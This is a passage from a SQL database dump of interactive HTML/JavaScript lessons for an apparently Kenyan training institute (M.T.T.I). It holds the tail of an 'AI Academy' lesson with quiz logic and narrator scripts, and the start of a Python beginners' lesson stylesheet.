hype''],\n       [''&#128683;'',''Red Flags'',''AI that fabricates citations, confidently gives wrong answers, or ignores context should be avoided'']].map(function(item){\n         return ''<div style="display:flex;gap:14px;align-items:flex-start;background:rgba(255,255,255,.05);border-radius:10px;padding:14px 16px"><div style="font-size:22px;flex-shrink:0">''+item[0]+''</div><div><div style="font-weight:700;color:var(--blue-light);margin-bottom:2px">''+item[1]+''</div><div style="font-size:13px;color:rgba(248,250,252,.65);font-weight:300">''+item[2]+''</div></div></div>'';\n       }).join('''') +\n      ''</div></div><div class="content-block"><h3 class="block-title">Coming Up in Weeks 3 & 4</h3><div style="display:flex;gap:10px;flex-wrap:wrap"><span class="info-pill">&#128247; Graphic Design AI Deep Dive</span><span class="info-pill">&#127916; Video AI Tools</span><span class="info-pill">&#128187; Coding AI</span><span class="info-pill">&#128200; Marketing & SEO AI</span><span class="info-pill">&#127775; Prompt Engineering</span><span class="info-pill">&#127891; AI in Education</span></div></div>''\n  }\n\n];\n\n// ═══════════════════════ STATE ═══════════════════════\nvar currentStep = 0;\nvar quizAnswers = {};\nvar quizScore = 0;\n\n// ═══════════════════════ NAVIGATION ═══════════════════════\nfunction showScreen(id) {\n  document.querySelectorAll(''.screen'').forEach(function(s) { s.classList.remove(''active''); });\n  document.getElementById(id).classList.add(''active'');\n}\nfunction startLesson() { showScreen(''lesson''); renderStep(0); }\nfunction skipToSummary() { quizScore = 6; showSummary(); }\nfunction goSplash() { showScreen(''splash''); }\nfunction restartLesson() { currentStep = 0; quizAnswers = {}; quizScore = 0; showScreen(''lesson''); renderStep(0); }\nfunction showSummary() {\n  document.getElementById(''scorePct'').textContent = Math.round((quizScore / 8) * 100) + ''%'';\n  showScreen(''summary'');\n}\n\n// ═══════════════════════ RENDER ═══════════════════════\nfunction renderStep(idx) {\n  currentStep = idx;\n  var step = steps[idx];\n  var total = steps.length;\n\n  document.getElementById(''progressFill'').style.width = ((idx / (total - 1)) * 100) + ''%'';\n  document.getElementById(''progressLabel'').textContent = ''Step '' + (idx + 1) + '' / '' + total;\n\n  var tabs = document.querySelectorAll(''.module-tab'');\n  tabs.forEach(function(t, i) {\n    t.classList.remove(''active'',''locked'',''done'');\n    if (i === step.mod) t.classList.add(''active'');\n    else if (i < step.mod) t.classList.add(''done'');\n    else t.classList.add(''locked'');\n  });\n\n  var wrap = document.getElementById(''lessonContent'');\n\n  if (step.type === ''content'') {\n    wrap.innerHTML =\n      ''<div class="lesson-header"><div class="lesson-tag">'' + step.tag + ''</div><h1 class="lesson-title">'' + step.title + ''</h1></div>'' +\n      renderDots(idx) + step.html + renderNavFooter(idx);\n  } else if (step.type === ''decision'') {\n    wrap.innerHTML =\n      ''<div class="lesson-header"><div class="lesson-tag">WEEKS 1 &amp; 2 · DECISION LAB</div><h1 class="lesson-title">Real-World Scenario</h1><p class="lesson-desc">Apply what you have learned to make the right strategic decision.</p></div>'' +\n      renderDots(idx) +\n      ''<div class="scenario-box"><div class="scenario-label">'' + step.scenario.label + ''</div><div class="scenario-title">'' + step.scenario.title + ''</div><p class="scenario-text">'' + step.scenario.text + ''</p></div>'' +\n      ''<div class="choices-wrap" id="choices">'' +\n        step.choices.map(function(c, ci) {\n          return ''<button class="choice-btn" onclick="selectChoice('' + idx + '','' + ci + '')" id="choice-'' + ci + ''"><div class="choice-letter">'' + c.letter + ''</div><div class="choice-text">'' + c.text + ''</div></button>'';\n        }).join('''') +\n      ''</div>'' +\n      ''<div class="feedback-box" id="feedback"></div>'' +\n      ''<div id="nextWrap" style="display:none"></div>'';\n  } else if (step.type === ''quiz'') {\n    wrap.innerHTML =\n      ''<div class="lesson-header"><div class="lesson-tag">WEEKS 1 &amp; 2 · QUIZ</div><h1 class="lesson-title">'' + step.title + ''</h1><p class="lesson-desc">'' + step.subtitle + ''</p></div>'' +\n      renderDots(idx) +\n      step.questions.map(function(q, qi) {\n        return ''<div class="quiz-card" id="qcard-'' + qi + ''">'' +\n          ''<div class="quiz-q">Q'' + (qi+1) + ''. '' + q.q + ''</div>'' +\n          ''<div class="quiz-sub">// Choose the best answer</div>'' +\n          ''<div class="quiz-options">'' +\n            q.options.map(function(opt, oi) {\n              return ''<div class="quiz-opt" onclick="selectQuizAns('' + idx + '','' + qi + '','' + oi + '')" id="qopt-'' + qi + ''-'' + oi + ''"><span style="font-family:\\''JetBrains Mono\\'',monospace;font-size:11px;color:var(--muted)">'' + String.fromCharCode(65+oi) + ''.</span> '' + opt + ''</div>'';\n            }).join('''') +\n          ''</div>'' +\n          ''<div id="qfeed-'' + qi + ''" style="margin-top:12px;font-size:13px;font-weight:600;display:none"></div>'' +\n        ''</div>'';\n      }).join('''') +\n      ''<div id="quizSubmitWrap" style="text-align:center;padding:10px 0 30px"><button class="btn btn-violet" onclick="submitQuiz('' + idx + '')">Submit Quiz &#8594;</button></div>'';\n  }\n\n  wrap.scrollTop = 0;\n  window.scrollTo({ top: 0, behavior: ''smooth'' });\n\n  var narratorBar = document.getElementById(''narrator-bar'');\n  if (narratorBar && !narratorBar.classList.contains(''hidden'')) {\n    narratorStop();\n    var titleEl = document.getElementById(''narratorTitle'');\n    if (titleEl) titleEl.textContent = step.title || ''Lesson'';\n    narratorSetUI(''stopped'');\n  }\n}\n\nfunction renderDots(idx) {\n  return ''<div class="lesson-dots">'' + steps.map(function(_, i) {\n    return ''<div class="dot '' + (i === idx ? ''current'' : i < idx ? ''done'' : '''') + ''"></div>'';\n  }).join('''') + ''</div>'';\n}\n\nfunction renderNavFooter(idx) {\n  var isFirst = idx === 0;\n  var isLast = idx === steps.length - 1;\n  return ''<div class="nav-footer">'' +\n    (!isFirst ? ''<button class="btn btn-surface" onclick="renderStep('' + (idx-1) + '')">&#8592; Previous</button>'' : ''<div></div>'') +\n    (!isLast ? ''<button class="btn btn-blue" onclick="renderStep('' + (idx+1) + '')">Next &#8594;</button>'' : ''<button class="btn btn-emerald" onclick="showSummary()">&#127942; Finish Course</button>'') +\n  ''</div>'';\n}\n\n// ═══════════════════════ DECISION LOGIC ═══════════════════════\nfunction selectChoice(stepIdx, choiceIdx) {\n  var step = steps[stepIdx];\n  var choice = step.choices[choiceIdx];\n  var fb = document.getElementById(''feedback'');\n  var nextWrap = document.getElementById(''nextWrap'');\n\n  document.querySelectorAll(''.choice-btn'').forEach(function(b) { b.onclick = null; });\n\n  var btn = document.getElementById(''choice-'' + choiceIdx);\n  btn.classList.add(choice.correct ? ''selected-correct'' : ''selected-wrong'');\n  btn.querySelector(''.choice-letter'').textContent = choice.correct ? ''✓'' : ''✗'';\n\n  if (choice.correct) {\n    fb.className = ''feedback-box correct show'';\n    fb.innerHTML = ''<div class="feedback-icon">'' + step.feedback.correct.icon + ''</div><div class="feedback-title">'' + step.feedback.correct.title + ''</div><p class="feedback-text">'' + step.feedback.correct.text + ''</p>'';\n  } else {\n    fb.className = ''feedback-box wrong show'';\n    fb.innerHTML = ''<div class="feedback-icon">'' + step.feedback.wrong.icon + ''</div><div class="feedback-title">'' + step.feedback.wrong.title + ''</div><p class="feedback-text">'' + step.feedback.wrong.text + ''</p>'';\n    var correctIdx = step.choices.findIndex(function(c) { return c.correct; });\n    var correctBtn = document.getElementById(''choice-'' + correctIdx);\n    correctBtn.classList.add(''selected-correct'');\n    correctBtn.querySelector(''.choice-letter'').textContent = ''✓'';\n  }\n\n  nextWrap.style.display = ''block'';\n  nextWrap.innerHTML = renderNavFooter(stepIdx);\n  fb.scrollIntoView({ behavior: ''smooth'', block: ''nearest'' });\n}\n\n// ═══════════════════════ QUIZ LOGIC ═══════════════════════\nfunction selectQuizAns(stepIdx, qi, oi) {\n  if (quizAnswers[qi] !== undefined) return;\n  quizAnswers[qi] = oi;\n  var step = steps[stepIdx];\n  var correct = step.questions[qi].correct;\n  var isRight = oi === correct;\n  if (isRight) quizScore++;\n\n  document.getElementById(''qopt-'' + qi + ''-'' + oi).classList.add(isRight ? ''correct-ans'' : ''wrong-ans'');\n  if (!isRight) document.getElementById(''qopt-'' + qi + ''-'' + correct).classList.add(''reveal-correct'');\n  document.querySelectorAll(''[id^="qopt-'' + qi + ''-"]'').forEach(function(el) { el.onclick = null; });\n\n  var feed = document.getElementById(''qfeed-'' + qi);\n  feed.style.display = ''block'';\n  feed.style.color = isRight ? ''var(--emerald)'' : ''var(--rose)'';\n  feed.textContent = isRight ? ''✅ Correct!'' : ''❌ Incorrect. The answer is: "'' + step.questions[qi].options[correct] + ''"'';\n}\n\nfunction submitQuiz(stepIdx) {\n  var step = steps[stepIdx];\n  var total = step.questions.length;\n  var answered = Object.keys(quizAnswers).length;\n  if (answered < total) {\n    alert(''Please answer all '' + total + '' questions before submitting.'');\n    return;\n  }\n  document.getElementById(''quizSubmitWrap'').innerHTML =\n    ''<div style="background:var(--surface2);border:1px solid var(--border);border-radius:16px;padding:28px;text-align:center;margin-bottom:8px">'' +\n    ''<div style="font-family:\\''Syne\\'',sans-serif;font-size:42px;font-weight:800;color:var(--cyan)">'' + quizScore + ''/'' + total + ''</div>'' +\n    ''<div style="color:var(--muted);font-size:14px;margin:8px 0 20px">'' + (quizScore >= 7 ? ''&#127881; Outstanding! Top marks!'' : quizScore >= 5 ? ''&#128077; Good effort! Review the ones you missed.'' : ''&#128218; Review the material and try again'') + ''</div>'' +\n    renderNavFooter(stepIdx) + ''</div>'';\n}\n\n// ═══════════════════════ NARRATOR ═══════════════════════\nvar SPEEDS = [0.8, 1, 1.2, 1.5];\nvar speedIdx = 1;\nvar narratorUtterance = null;\nvar narratorSpeaking = false;\nvar narratorPaused = false;\n\nvar narratorScripts = [\n  ''Welcome to the AI Academy! Let us start with the basics. Artificial Intelligence refers to computer systems designed to perform tasks that typically require human intelligence — such as learning, reasoning, problem solving, and understanding language. There are three stages of AI development. Narrow AI is what we have today — designed for specific tasks like Siri or Netflix recommendations. General AI is a future goal that would match human intelligence across all domains. And Super AI is a theoretical concept that would surpass human intelligence. Currently, all AI systems are Narrow AI.'',\n  ''Now let us explore how AI actually works. Unlike a recipe with fixed steps, AI learns patterns from data. The processing pipeline goes like this: data is input, processed, and features are extracted. The AI then recognises patterns and makes a decision or prediction. Machine Learning is at the core of modern AI. Supervised Learning learns from labeled examples — like email spam filters. Unsupervised Learning finds hidden patterns in unlabeled data — like customer segmentation. And Reinforcement Learning learns through trial and error with rewards — like game-playing AI. Neural networks, inspired by the human brain, have input layers, hidden layers, and output layers. Deep Learning uses many hidden layers to learn complex patterns.'',\n  ''Artificial Intelligence is used across almost every industry today. Natural Language Processing, or NLP, powers chatbots, translation tools, sentiment analysis, and content generation. In healthcare, AI analyses medical images to detect diseases. In finance, it detects fraud. In retail, recommendation engines suggest products you might like. Agriculture uses AI drones for crop monitoring. And human resources uses AI for resume screening. Recommendation engines like those used by Netflix, Amazon, and Spotify work by collecting user data, finding patterns, comparing similar users, and then presenting personalised suggestions.'',\n  ''Now let us look at the challenges and ethical concerns around AI. AI bias is a critical problem — it occurs when AI systems reflect and amplify prejudices in training data. For example, hiring AI that discriminates against certain groups based on biased historical data, or facial recognition that performs worse on darker skin tones. Key ethical principles for AI include transparency, fairness, privacy, accountability, safety, and human oversight. On employment, AI puts routine and data-entry jobs most at risk, while creative, strategic, and emotionally intelligent roles are safer for now.'',\n  ''It is decision time! Kenyatta National Hospital wants to implement AI for diagnostics. They are choosing between fully replacing radiologists with AI, or using AI as a support tool that flags issues for doctors to review. Think carefully about the ethical principle of human oversight in high-stakes medical decisions.'',\n  ''Welcome to Week 2! Let us explore AI tools. AI tools are software applications powered by artificial intelligence. They range from writing assistants to image generators to coding tools. Paid AI tools give you access to the latest models, unlimited usage, commercial rights, priority support, and privacy guarantees — great for professional and commercial work. Free AI tools use older models, have usage limits, and often restrict commercial use — but they are excellent for learning and personal projects. Key tools include Jasper AI for marketing content, ChatGPT for general tasks, GitHub Copilot for coding, and Canva AI for design.'',\n  ''Let us look at more AI tools across different fields. For design, Midjourney produces stunning professional artwork from text prompts. Canva AI provides easy drag-and-drop design for free. For video, Synthesia creates AI avatar videos from a script with no filming needed. For marketing, Surfer SEO provides real-time search engine optimisation scoring. For productivity, Notion AI helps with knowledge management and note-taking. And ElevenLabs generates highly realistic AI voices for audio content. When deciding whether to pay for an AI tool, calculate your ROI: time saved per month multiplied by your hourly rate, minus the tool cost. ROI over 200 percent means the tool is highly justified.'',\n  ''Another decision scenario! A student at M.T.T.I needs graphics, a video, and written content for a business proposal, but has almost no budget. She must choose the best free AI tools. Think about which combination covers all her needs without spending money.'',\n  ''Now let us learn how to evaluate AI quality. The 5-Question Test helps you assess any AI tool quickly. The Factual Accuracy Test checks if AI gives correct information or admits uncertainty. The Reasoning Test checks if it shows its working on calculations. The Creativity Test checks if responses are original and relevant. The Context Test checks if the AI remembers previous parts of the conversation. And the Limitation Test checks if the AI admits what it does not know. Red flags include fabricating citations, confidently giving wrong facts, ignoring instructions, and generating harmful content. The 5-Step selection framework is: define your needs, research options, test free versions first, evaluate results, and then make a data-driven decision.'',\n  ''Decision time again! Wanjiru runs a digital marketing agency in Nairobi with 5 staff. She needs AI for writing client blogs published commercially, designing social media graphics, and optimising websites for Google. She has a budget of 15,000 Kenya Shillings per month. Which paid tool strategy serves her business needs best?'',\n  ''It is quiz time! You have now covered everything from Weeks 1 and 2 — AI fundamentals, machine learning, real-world applications, ethics and bias, and AI tools including paid and free options, evaluation methods, and decision frameworks. Take your time on each question and choose the best answer. Good luck!'',\n  ''Congratulations on completing Weeks 1 and 2 of the AI Academy! You have learned what AI is and its three stages, how machine learning and neural networks work, real-world applications across industries, ethics and bias in AI, and how to choose and evaluate AI tools. In Weeks 3 and 4, we will go deeper into graphic design AI, video AI, coding AI, marketing tools, and prompt engineering. Keep up the excellent work!''\n];\n\nfunction getNarratorText(idx) {\n  if (idx < narratorScripts.length) return narratorScripts[idx];\n  return ''You are on step '' + (idx + 1) + ''. Keep exploring the content on screen.'';\n}\n\nfunction narratorSetUI(state) {\n  var btn = document.getElementById(''narratorPlayBtn'');\n  var wave = document.getElementById(''narratorWave'');\n  var lbl = document.getElementById(''narratorStatus'');\n  if (state === ''playing'') {\n    btn.innerHTML = ''&#9646;&#9646;'';\n    wave.classList.add(''active'');\n    if (lbl) lbl.textContent = ''Speaking...'';\n  } else if (state === ''paused'') {\n    btn.innerHTML = ''&#9654;'';\n    wave.classList.remove(''active'');\n    if (lbl) lbl.textContent = ''Paused'';\n  } else {\n    btn.innerHTML = ''&#9654;'';\n    wave.classList.remove(''active'');\n    if (lbl) lbl.textContent = ''Ready'';\n  }\n}\n\nfunction pickVoice(utt) {\n  var voices = window.speechSynthesis.getVoices();\n  if (!voices || voices.length === 0) return;\n  var best = null, ok = null;\n  for (var i = 0; i < voices.length; i++) {\n    var v = voices[i];\n    if (!v.lang || v.lang.indexOf(''en'') !== 0) continue;\n    if (!ok) ok = v;\n    if (v.name.indexOf(''Google'') > -1 || v.name.indexOf(''Samantha'') > -1 || v.name.indexOf(''Daniel'') > -1 || v.name.indexOf(''Karen'') > -1) { best = v; break; }\n  }\n  utt.voice = best || ok || null;\n}\n\nfunction doSpeak(text) {\n  var synth = window.speechSynthesis;\n  synth.cancel();\n  var utt = new SpeechSynthesisUtterance(text);\n  utt.rate = SPEEDS[speedIdx];\n  utt.pitch = 1.0;\n  utt.lang = ''en-US'';\n  pickVoice(utt);\n  var keepAlive;\n  utt.onstart = function() { narratorSpeaking = true; narratorPaused = false; narratorSetUI(''playing''); keepAlive = setInterval(function() { if (!synth.speaking) { clearInterval(keepAlive); } else { synth.pause(); synth.resume(); } }, 10000); };\n  utt.onend = function() { clearInterval(keepAlive); narratorSpeaking = false; narratorPaused = false; narratorSetUI(''stopped''); };\n  utt.onerror = function(e) { clearInterval(keepAlive); if (e && (e.error === ''interrupted'' || e.error === ''canceled'')) return; narratorSpeaking = false; narratorPaused = false; narratorSetUI(''stopped''); };\n  narratorSetUI(''playing'');\n  synth.speak(utt);\n  narratorUtterance = utt;\n}\n\nfunction narratorSpeak(idx) {\n  if (!window.speechSynthesis) { alert(''Text-to-speech is not supported. Try Chrome or Edge.''); return; }\n  var titleEl = document.getElementById(''narratorTitle'');\n  var step = steps[idx];\n  if (titleEl) titleEl.textContent = step ? (step.title || ''Lesson'') : ''Complete'';\n  var text = getNarratorText(idx);\n  var voices = window.speechSynthesis.getVoices();\n  if (voices && voices.length > 0) {\n    doSpeak(text);\n  } else {\n    narratorSetUI(''playing'');\n    var done = false;\n    window.speechSynthesis.onvoiceschanged = function() { if (done) return; done = true; window.speechSynthesis.onvoiceschanged = null; doSpeak(text); };\n    setTimeout(function() { if (!done) { done = true; doSpeak(text); } }, 1000);\n  }\n}\n\nfunction showNarrator() {\n  document.getElementById(''narrator-bar'').classList.remove(''hidden'');\n  document.getElementById(''narrator-toggle'').classList.add(''bar-visible'');\n  var step = steps[currentStep];\n  var titleEl = document.getElementById(''narratorTitle'');\n  if (titleEl) titleEl.textContent = step ? (step.title || ''Lesson'') : ''Ready'';\n  narratorSetUI(''stopped'');\n}\n\nfunction hideNarrator() {\n  narratorStop();\n  document.getElementById(''narrator-bar'').classList.add(''hidden'');\n  document.getElementById(''narrator-toggle'').classList.remove(''bar-visible'');\n}\n\nfunction narratorToggle() {\n  if (!window.speechSynthesis) return;\n  if (narratorSpeaking && !narratorPaused) {\n    window.speechSynthesis.pause(); narratorPaused = true; narratorSpeaking = false; narratorSetUI(''paused'');\n  } else if (narratorPaused) {\n    window.speechSynthesis.resume(); narratorPaused = false; narratorSpeaking = true; narratorSetUI(''playing'');\n  } else {\n    narratorSpeak(currentStep);\n  }\n}\n\nfunction narratorStop() {\n  if (window.speechSynthesis) window.speechSynthesis.cancel();\n  narratorSpeaking = false; narratorPaused = false; narratorUtterance = null;\n  narratorSetUI(''stopped'');\n}\n\nfunction cycleSpeed() {\n  speedIdx = (speedIdx + 1) % SPEEDS.length;\n  var labels = [''0.8x'', ''1x'', ''1.2x'', ''1.5x''];\n  document.getElementById(''narratorSpeedBtn'').textContent = labels[speedIdx];\n  if (narratorSpeaking || narratorPaused) narratorSpeak(currentStep);\n}\n\nwindow.addEventListener(''DOMContentLoaded'', function() {\n  if (window.speechSynthesis) window.speechSynthesis.onvoiceschanged = function() {};\n});\n</script>\n</body>\n</html>\n', 'html_interactive', NULL, NULL, NULL, NULL, 0, 0, 9, 'Published', 1, '2026-03-04 02:50:29', '2026-03-11 06:49:29', NULL, NULL);
INSERT INTO `wpcu_mtti_lessons` VALUES
(8, 9, NULL, 'Python Intro Lesson', 'Introduction to Python', '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n<meta name="viewport" content="width=device-width, initial-scale=1.0">\n<title>Python for Beginners | M.T.T.I Interactive Lesson</title>\n<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=DM+Sans:wght@400;500;600;700&family=Fraunces:wght@700;900&display=swap" rel="stylesheet">\n<style>\n*{margin:0;padding:0;box-sizing:border-box}\n:root{\n  --bg:#0a0f0a;--bg2:#111a11;--bg3:#182018;--bg4:#1e2b1e;\n  --green:#4ade80;--green2:#22c55e;--green3:#16a34a;--green-dim:rgba(74,222,128,.08);\n  --yellow:#fbbf24;--orange:#f97316;--blue:#38bdf8;--pink:#f472b6;--purple:#a78bfa;--red:#f87171;\n  --text:#e4f1e4;--text2:#9fc09f;--text3:#5a7a5a;\n  --radius:14px;--ease:cubic-bezier(.4,0,.2,1);\n}\nhtml{scroll-behavior:smooth}\nbody{font-family:''DM Sans'',sans-serif;background:var(--bg);color:var(--text);line-height:1.7;overflow-x:hidden}\n\n/* Scrollbar */\n::-webkit-scrollbar{width:6px}\n::-webkit-scrollbar-track{background:var(--bg2)}\n::-webkit-scrollbar-thumb{background:var(--green3);border-radius:10px}\n\n/* --- HERO --- */\n.hero{min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 20px;position:relative;overflow:hidden}\n.hero::before{content:'''';position:absolute;top:-200px;left:50%;transform:translateX(-50%);width:800px;height:800px;background:radial-gradient(circle,rgba(74,222,128,.12) 0%,transparent 70%);pointer-events:none;animation:pulse-glow 4s ease infinite}\n@keyframes pulse-glow{0%,100%{opacity:.6;transform:translateX(-50%) scale(1)}50%{opacity:1;transform:translateX(-50%) scale(1.1)}}\n.hero-badge{display:inline-flex;align-items:center;gap:8px;background:var(--green-dim);border:1px solid rgba(74,222,128,.2);border-radius:50px;padding:6px 18px;font-size:12px;color:var(--green);font-weight:600;letter-spacing:.08em;text-transform:uppercase;margin-bottom:28px;animation:fadeDown .6s var(--ease) both}\n.hero-badge .dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:blink 1.5s infinite}\n@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}\n.hero h1{font-family:''Fraunces'',serif;font-size:clamp(42px,8vw,86px);font-weight:900;line-height:1.05;margin-bottom:18px;animation:fadeDown .7s var(--ease) .1s both}\n.hero h1 .accent{background:linear-gradient(135deg,var(--green),var(--blue));-webkit-background-clip:text;-webkit-text-fill-color:transparent}\n.hero .subtitle{font-size:clamp(16px,2.5vw,22px);color:var(--text2);max-width:600px;margin:0 auto 36px;animation:fadeDown .7s var(--ease) .2s both}\n.hero .start-btn{display:inline-flex;align-items:center;gap:10px;padding:16px 40px;background:linear-gradient(135deg,var(--green3),var(--green2));color:var(--bg);font-size:17px;font-weight:700;border:none;border-radius:60px;cursor:pointer;text-decoration:none;transition:all .3s var(--ease);box-shadow:0 4px 30px rgba(74,222,128,.3);animation:fadeDown .7s var(--ease) .3s both}\n.hero .start-btn:hover{transform:translateY(-3px) scale(1.03);box-shadow:0 8px 40px rgba(74,222,128,.45)}\n.hero .snake{position:absolute;bottom:40px;font-size:60px;animation:float 3s ease infinite}\n@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-14px)}}\n@keyframes fadeDown{from{opacity:0;transform:translateY(-20px)}to{opacity:1;transform:translateY(0)}}\n\n/* --- NAV PROGRESS --- */\n.progress-bar{position:fixed;top:0;left:0;height:4px;background:linear-gradient(90deg,var(--green),var(--blue));z-index:1000;transition:width .4s var(--ease);width:0%}\n\n/* --- SECTIONS --- */\n.lesson-section{max-width:860px;margin:0 auto;padding:80px 24px}\n.section-num{font-family:''JetBrains Mono'',monospace;font-size:13px;color:var(--green);font-weight:700;letter-spacing:.15em;text-transform:uppercase;margin-bottom:10px;display:flex;align-items:center;gap:8px}\n.section-num::before{content:'''';width:30px;height:2px;background:var(--green)}\n.lesson-section h2{font-family:''Fraunces'',serif;font-size:clamp(28px,5vw,42px);font-weight:700;margin-bottom:14px;line-height:1.2}\n.lesson-section .desc{color:var(--text2);font-size:17px;margin-bottom:32px;max-width:640px}\n\n/* --- INFO CARDS --- */\n.info-card{background:var(--bg2);border:1px solid rgba(74,222,128,.1);border-radius:var(--radius);padding:24px;margin-bottom:18px;position:relative;overflow:hidden}\n.info-card::before{content:'''';position:absolute;top:0;left:0;width:3px;height:100%;background:var(--green)}\n.info-card h3{font-size:16px;font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:10px}\n.info-card p{color:var(--text2);font-size:14px;line-height:1.7}\n\n/* --- CODE EDITOR --- */\n.code-playground{background:var(--bg2);border:1px solid rgba(74,222,128,.12);border-radius:var(--radius);overflow:hidden;margin:24px 0;box-shadow:0 8px 40px rgba(0,0,0,.4)}\n.code-toolbar{display:flex;align-items:center;justify-content:space-between;padding:10px 16px;background:var(--bg3);border-bottom:1px solid rgba(74,222,128,.08)}\n.code-dots{display:flex;gap:6px}\n.code-dots span{width:10px;height:10px;border-radius:50%}\n.code-dots span:nth-child(1){background:#f87171}\n.code-dots span:nth-child(2){background:#fbbf24}\n.code-dots span:nth-child(3){background:#4ade80}\n.code-filename{font-family:''JetBrains Mono'',monospace;font-size:12px;color:var(--text3)}\n.run-btn{display:flex;align-items:center;gap:6px;padding:6px 16px;background:var(--green3);color:white;border:none;border-radius:8px;font-size:12px;font-weight:700;cursor:pointer;font-family:''JetBrains Mono'',monospace;transition:all .2s}\n.run-btn:hover{background:var(--green2);transform:scale(1.04)}\n.code-editor{width:100%;min-height:120px;padding:18px;font-family:''JetBrains Mono'',monospace;font-size:14px;line-height:1.8;background:var(--bg);color:var(--green);border:none;outline:none;resize:vertical;tab-size:4}\n.code-output{padding:14px 18px;background:var(--bg3);border-top:1px solid rgba(74,222,128,.08);font-family:''JetBrains Mono'',monospace;font-size:13px;color:var(--text);min-height:44px;white-space:pre-wrap;display:none}\n.code-output.show{display:block}\n.code-output .label{color:var(--text3);font-size:11px;margin-bottom:6px;display:block}\n.code-output .success{color:var(--green)}\n.code-output .error{color:var(--red)}\n\n/* --- QUIZ --- */\n.quiz-box{background:var(--bg2);border:1px solid rgba(74,222,128,.1);border-radius:var(--radius);padding:28px;margin:28px 0}\n.quiz-box h3{font-size:18px;margin-bottom:6px;display:flex;align-items:center;gap:10px}\n.quiz-box .question{color:var(--text2);font-size:15px;margin-bottom:18px}\n.quiz-options{display:flex;flex-direction:column;gap:10px}\n.quiz-opt{display:flex;align-items:center;gap:12px;padding:13px 18px;background:var(--bg3);border:2px solid transparent;border-radius:10px;cursor:pointer;transition:all .25s var(--ease);font-size:14px;color:var(--text)}\n.quiz-opt:hover{border-color:rgba(74,222,128,.3);background:var(--bg4)}\n.quiz-opt.correct{border-color:var(--green)!important;background:rgba(74,222,128,.08)!important}\n.quiz-opt.wrong{border-color:var(--red)!important;background:rgba(248,113,113,.06)!important}\n.quiz-opt .letter{width:28px;height:28px;border-radius:50%;background:var(--bg);display:flex;align-items:center;justify-content:center;font-weight:700;font-size:12px;flex-shrink:0;border:1px solid var(--text3);transition:all .25s}\n.quiz-opt.correct .letter{background:var(--green);color:var(--bg);border-color:var(--green)}\n.quiz-opt.wrong .letter{background:var(--red);color:white;border-color:var(--red)}\n.quiz-feedback{margin-top:14px;padding:12px 16px;border-radius:10px;font-size:14px;display:none}\n.quiz-feedback.show{display:block}\n.quiz-feedback.correct{background:rgba(74,222,128,.08);border:1px solid rgba(74,222,128,.2);color:var(--green)}\n.quiz-feedback.wrong{background:rgba(248,113,113,.06);border:1px solid rgba(248,113,113,.15);color:var(--red)}\n\n/* --- CHALLENGE --- */\n.challenge-box{background:linear-gradient(135deg,rgba(74,222,128,.06),rgba(56,189,248,.04));border:1px solid rgba(74,222,128,.15);border-radius:var(--radius);padding:28px;margin:28px 0;position:relative}\n.challenge-box::before{content:''🏆'';position:absolute;top:-14px;right:20px;font-size:28px}\n.challenge-box h3{color:var(--yellow);font-size:17px;margin-bottom:6px}\n.challenge-box .instructions{color:var(--text2);font-size:14px;margin-bottom:16px}\n.hint-btn{background:none;border:1px solid var(--text3);color:var(--text3);padding:6px 14px;border-radius:8px;font-size:12px;cursor:pointer;font-family:''DM Sans'',sans-serif;transition:all .2s}\n.hint-btn:hover{border-color:var(--yellow);color:var(--yellow)}\n.hint-text{margin-top:10px;padding:12px;background:rgba(251,191,36,.06);border:1px solid rgba(251,191,36,.15);border-radius:8px;font-size:13px;color:var(--yellow);display:none}\n.hint-text.show{display:block}\n\n/* --- CONCEPT CARDS --- */\n.concept-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px;margin:24px 0}\n.concept-card{background:var(--bg2);border:1px solid rgba(74,222,128,.08);border-radius:var(--radius);padding:22px;text-align:center;transition:all .3s var(--ease);cursor:default}\n.concept-card:hover{transform:translateY(-4px);border-color:rgba(74,222,128,.25);box-shadow:0 8px 30px rgba(0,0,0,.3)}\n.concept-card .icon{font-size:34px;margin-bottom:10px;display:block}\n.concept-card h4{font-size:14px;font-weight:700;margin-bottom:6px}\n.concept-card p{font-size:12px;color:var(--text3);line-height:1.5}\n\n/* --- TYPE EXPLORER --- */\n.type-explorer{display:flex;gap:10px;flex-wrap:wrap;margin:18px 0}\n.type-tag{padding:10px 18px;border-radius:10px;font-family:''JetBrains Mono'',monospace;font-size:13px;cursor:pointer;transition:all .25s;border:2px solid transparent}\n.type-tag[data-type="str"]{background:rgba(74,222,128,.08);color:var(--green);border-color:rgba(74,222,128,.15)}\n.type-tag[data-type="int"]{background:rgba(56,189,248,.08);color:var(--blue);border-color:rgba(56,189,248,.15)}\n.type-tag[data-type="float"]{background:rgba(249,115,22,.08);color:var(--orange);border-color:rgba(249,115,22,.15)}\n.type-tag[data-type="bool"]{background:rgba(244,114,182,.08);color:var(--pink);border-color:rgba(244,114,182,.15)}\n.type-tag[data-type="list"]{background:rgba(167,139,250,.08);color:var(--purple);border-color:rgba(167,139,250,.15)}\n.type-tag:hover{transform:scale(1.06)}\n.type-tag.active{transform:scale(1.08);box-shadow:0 0 20px rgba(74,222,128,.15)}\n.type-detail{background:var(--bg2);border:1px solid rgba(74,222,128,.1);border-radius:var(--radius);padding:22px;margin-top:14px;display:none}\n.type-detail.show{display:block;animation:fadeIn .3s ease}\n@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}\n\n/* --- SCOREBOARD --- */\n.scoreboard{position:fixed;bottom:20px;right:20px;background:var(--bg2);border:1px solid rgba(74,222,128,.15);border-radius:var(--radius);padding:14px 20px;display:flex;align-items:center;gap:14px;z-index:100;box-shadow:0 8px 40px rgba(0,0,0,.5);transition:all .3s}\n.scoreboard .score-label{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.1em}\n.scoreboard .score-val{font-family:''JetBrains Mono'',monospace;font-size:24px;font-weight:700;color:var(--green)}\n.scoreboard .xp{font-size:11px;color:var(--yellow)}\n.score-pop{position:fixed;pointer-events:none;font-family:''JetBrains Mono'',monospace;font-weight:700;font-size:22px;color:var(--green);z-index:999;animation:scorePop .8s var(--ease) forwards}\n@keyframes 